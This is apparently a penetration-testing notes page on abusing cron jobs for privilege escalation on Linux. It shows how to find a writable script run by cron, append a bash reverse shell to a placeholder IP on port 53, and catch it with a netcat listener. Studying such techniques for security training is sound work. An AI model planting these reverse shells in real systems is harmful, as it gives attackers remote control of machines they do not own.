# Cron Jobs

Cron jobs are scheduled tasks that are executed automatically at specific intervals on Unix-like operating systems. The name "cron" comes from the Greek word "chronos," meaning time, as these jobs are related to time-based scheduling.

User crontabs are usually located in /var/spool/cron/ or /var/spool/cron/crontabs/

The system-wide crontab is located at /etc/crontab.

{% code overflow="wrap" %}
```bash
cat /etc/crontab
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

```bash
# Check if you can edit the file
ls -l /usr/local/bin/compress.sh

# If you can edit the shell above, add the following reverse shell command.
bash -i >& /dev/tcp/<IP Address>/53 0>&1

# At Kali, set up a netcat listener 
nc -nlvp 53
```

Wait for a next cron job to run. You will see the conneciton.

<figure><img src="../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>
